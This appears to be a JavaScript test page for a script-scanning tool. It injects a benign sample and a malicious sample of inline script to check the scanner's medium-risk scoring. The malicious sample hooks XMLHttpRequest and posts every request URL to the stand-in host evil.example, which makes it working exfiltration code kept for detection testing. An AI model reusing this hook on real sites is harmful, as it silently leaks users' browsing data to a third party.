const statusEl = document.getElementById("status");
const setStatus = (s) => { if (statusEl) statusEl.textContent = s; };

// 아래 스니펫들은 scoring-model-v1.json의 substring 매칭을 기준으로
// 50~79(중간) 구간을 타도록 문자열을 구성한 회귀 테스트 샘플
// - BENIGN: UI/핸들러 관련 문자열 위주(실제 악성 동작 없음)
// - MALICIOUS: XHR hook + https exfil 패턴(전형적인 악성)

const SNIPPET_BENIGN_MED = `
// BENIGN regression sample: harmless strings for UI overlay + click handling.
// (intentionally medium by heuristics; no network exfil, no eval)
const overlayCss = "position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;opacity:0;";
const msg = String.fromCharCode(84, 117, 116, 111, 114, 105, 97, 108); // fromCharCode
const handlerName = "onclick";
const onClick = (e) => { e.preventDefault(); e.stopPropagation(); };
const _ = 'addEventListener("mousedown"'; // keyword string only
console.log(msg, overlayCss, handlerName, onClick, _);
`.trim();

const SNIPPET_MAL_MED = `
// MALICIOUS regression sample: XHR prototype hook + exfil to https://evil.example/collect
(function () {
  const _open = XMLHttpRequest.prototype.open;
  const _send = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (method, url) {
    this.__brs_u = url;
    return _open.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    try {
      fetch("https://evil.example/collect", { method: "POST", body: String(this.__brs_u || "") });
    } catch {}
    return _send.apply(this, arguments);
  };
})();
`.trim();

function injectInlineScript(text) {
  const s = document.createElement("script");
  s.type = "text/javascript";
  s.textContent = text;
  (document.head || document.documentElement).appendChild(s);
  return s;
}

document.getElementById("btn-benign")?.addEventListener("click", () => {
  setStatus("Injecting BENIGN(medium) inline script… (check dashboard for score/AI verdict)");
  injectInlineScript(SNIPPET_BENIGN_MED);
});

document.getElementById("btn-mal")?.addEventListener("click", () => {
  setStatus("Injecting MALICIOUS(medium) inline script… (check dashboard for score/AI verdict)");
  injectInlineScript(SNIPPET_MAL_MED);
});